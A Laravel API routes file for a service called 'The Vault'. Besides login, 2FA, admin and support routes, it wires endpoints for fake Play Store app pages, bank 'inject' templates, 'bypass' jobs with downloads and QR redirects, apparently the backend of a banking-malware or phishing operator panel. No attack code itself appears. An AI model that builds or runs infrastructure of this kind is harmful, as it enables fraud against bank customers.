<?php
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\PlayFakeController;
use App\Http\Controllers\QrCodeController;
use App\Http\Controllers\BypassController;
use App\Http\Controllers\BankInjectController;
use App\Http\Controllers\PublicAppController;
use App\Http\Controllers\AdminUserController;
use App\Http\Controllers\SupportController;
use App\Http\Controllers\TemplateController;
use App\Http\Controllers\LogController;
use App\Http\Controllers\ConsultaController;
use App\Http\Controllers\RankingController;
use App\Http\Controllers\BypassJobController;

Route::get('/health', function () { return response()->json(['status' => 'online', 'service' => 'The Vault API', 'timestamp' => now()]); });
Route::post('/auth/login', [AuthController::class, 'login']);
Route::get('/c/{slug}', [PublicAppController::class, 'show']);
Route::get('/q/{id}', [QrCodeController::class, 'redirect']);

Route::middleware('auth:sanctum')->group(function () {
    Route::get('/auth/me', [AuthController::class, 'me']);
    Route::post('/auth/logout', [AuthController::class, 'logout']);

    // 2FA TOTP routes
    Route::get('/auth/totp-secret', [AuthController::class, 'totpSecret']);
    Route::post('/auth/totp-enable', [AuthController::class, 'enableTotp']);
    Route::post('/auth/totp-disable', [AuthController::class, 'disableTotp']);
    Route::post('/auth/verify-totp', [AuthController::class, 'verifyTOTP']);

    Route::get('/tools/play-fake', [PlayFakeController::class, 'index']);
    Route::post('/tools/play-fake', [PlayFakeController::class, 'store']);

    Route::get('/play-fake-apps', [PlayFakeController::class, 'index']);
    Route::post('/play-fake-apps', [PlayFakeController::class, 'store']);
    Route::put('/play-fake-apps/{playFakeApp}', [PlayFakeController::class, 'update']);
    Route::delete('/play-fake-apps/{playFakeApp}', [PlayFakeController::class, 'destroy']);

    Route::get('/tools/qr-code', [QrCodeController::class, 'index']);
    Route::post('/tools/qr-code', [QrCodeController::class, 'store']);

    Route::get('/qr-code-links', [QrCodeController::class, 'index']);
    Route::post('/qr-code-links', [QrCodeController::class, 'store']);
    Route::put('/qr-code-links/{qrCodeLink}', [QrCodeController::class, 'update']);
    Route::delete('/qr-code-links/{qrCodeLink}', [QrCodeController::class, 'destroy']);

    Route::get('/tools/bypass', [BypassController::class, 'index']);
    Route::post('/tools/bypass', [BypassController::class, 'store']);

    Route::get('/bypass-rules', [BypassController::class, 'index']);
    Route::post('/bypass-rules', [BypassController::class, 'store']);
    Route::put('/bypass-rules/{bypassRule}', [BypassController::class, 'update']);
    Route::delete('/bypass-rules/{bypassRule}', [BypassController::class, 'destroy']);

    Route::get('/bypass/jobs/{job}', [BypassJobController::class, 'show']);
    Route::get('/bypass/jobs/{job}/download', [BypassJobController::class, 'download']);

    Route::get('/tools/inject-bancos', [BankInjectController::class, 'index']);
    Route::post('/tools/inject-bancos', [BankInjectController::class, 'store']);

    Route::get('/bank-injects', [BankInjectController::class, 'index']);
    Route::post('/bank-injects', [BankInjectController::class, 'store']);
    Route::put('/bank-injects/{bankInject}', [BankInjectController::class, 'update']);
    Route::delete('/bank-injects/{bankInject}', [BankInjectController::class, 'destroy']);

    Route::get('/templates', [TemplateController::class, 'index']);
    Route::get('/templates/{id}', [TemplateController::class, 'show']);
    Route::get('/templates/{id}/download', [TemplateController::class, 'download']);

    Route::middleware(['role.admin', 'twofactorauth'])->group(function () {
        Route::get('/admin/users-list', [AdminUserController::class, 'index']);
        Route::put('/admin/users-list/{id}', [AdminUserController::class, 'update']);
        Route::get('/admin/logs', [LogController::class, 'index']);
    });

    Route::get('/support/tickets', [SupportController::class, 'index']);
    Route::post('/support/tickets', [SupportController::class, 'store']);

    Route::get('/consultas', [ConsultaController::class, 'index']);
    Route::post('/consultas', [ConsultaController::class, 'store']);

    Route::get('/ranking/podio', [RankingController::class, 'podio']);
});